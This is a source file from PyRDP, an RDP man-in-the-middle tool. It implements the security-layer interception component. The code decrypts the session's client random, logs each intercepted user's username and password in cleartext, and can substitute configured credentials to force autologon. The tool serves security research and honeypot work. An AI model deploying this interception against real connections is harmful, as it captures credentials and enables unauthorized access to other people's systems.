#
# This file is part of the PyRDP project.
# Copyright (C) 2019 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

from logging import LoggerAdapter

from pyrdp.core import decodeUTF16LE
from pyrdp.enum import ClientInfoFlags, PlayerPDUType
from pyrdp.layer import SecurityLayer
from pyrdp.mitm.config import MITMConfig
from pyrdp.mitm.state import RDPMITMState
from pyrdp.parser import ClientInfoParser
from pyrdp.pdu import SecurityExchangePDU
from pyrdp.recording import Recorder


class SecurityMITM:
    """
    MITM component for the security layer.
    """

    def __init__(self, client: SecurityLayer, server: SecurityLayer, log: LoggerAdapter, config: MITMConfig, state: RDPMITMState, recorder: Recorder):
        """
        :param client: security layer for the client side
        :param server: security layer for the server side
        :param log: logger for this component
        :param config: the MITM configuration
        :param state: the MITM state
        :param recorder: recorder for this connection
        """
        self.client = client
        self.server = server
        self.log = log
        self.state = state
        self.config = config
        self.recorder = recorder

        self.client.createObserver(
            onLicensingDataReceived = self.onClientLicensingData,
            onSecurityExchangeReceived = self.onSecurityExchange,
            onClientInfoReceived=self.onClientInfo,
        )

        self.server.createObserver(
            onLicensingDataReceived = self.onServerLicensingData,
        )

    def onSecurityExchange(self, pdu: SecurityExchangePDU):
        """
        Set the security settings' client random from the security exchange.
        :param pdu: the security exchange
        """
        clientRandom = self.state.rc4RSAKey.decrypt(pdu.clientRandom[:: -1])[:: -1]
        self.state.securitySettings.setClientRandom(clientRandom)

        self.server.sendSecurityExchange(self.state.securitySettings.encryptClientRandom())

    def onClientInfo(self, data: bytes):
        """
        Log the client connection information and replace the username and password if applicable.
        :param data: the client info data
        """
        pdu = ClientInfoParser().parse(data)

        clientAddress = None

        if pdu.extraInfo:
            clientAddress = decodeUTF16LE(pdu.extraInfo.clientAddress)

        self.log.info("Client Info: username = %(username)r, password = %(password)r, domain = %(domain)r, clientAddress = %(clientAddress)r", {
            "username": pdu.username,
            "password": pdu.password,
            "domain": pdu.domain,
            "clientAddress": clientAddress
        })

        self.recorder.record(pdu, PlayerPDUType.CLIENT_INFO)

        # If set, replace the provided username and password to connect the user regardless of
        # the credentials they entered.
        if self.config.replacementUsername is not None:
            pdu.username = self.config.replacementUsername
        if self.config.replacementPassword is not None:
            pdu.password = self.config.replacementPassword

        if self.config.replacementUsername is not None and self.config.replacementPassword is not None:
            pdu.flags |= ClientInfoFlags.INFO_AUTOLOGON

        # Tell the server we don't want compression (unsure of the effectiveness of these flags)
        pdu.flags &= ~ClientInfoFlags.INFO_COMPRESSION
        pdu.flags &= ~ClientInfoFlags.INFO_CompressionTypeMask

        self.log.debug("Sending %(pdu)s", {"pdu": pdu})
        self.server.sendClientInfo(pdu)

    def onServerLicensingData(self, data: bytes):
        """
        Forward licensing data to the client and disable security headers if TLS is in use.
        :param data: the licensing data
        """
        if self.state.useTLS:
            self.client.securityHeaderExpected = False
            self.server.securityHeaderExpected = False

        self.client.sendLicensing(data)

    def onClientLicensingData(self, data: bytes):
        """
        Forward licensing data to the server and disable security headers if TLS is in use.
        :param data: the licensing data
        """
        if self.state.useTLS:
            self.client.securityHeaderExpected = False
            self.server.securityHeaderExpected = False

        self.server.sendLicensing(data)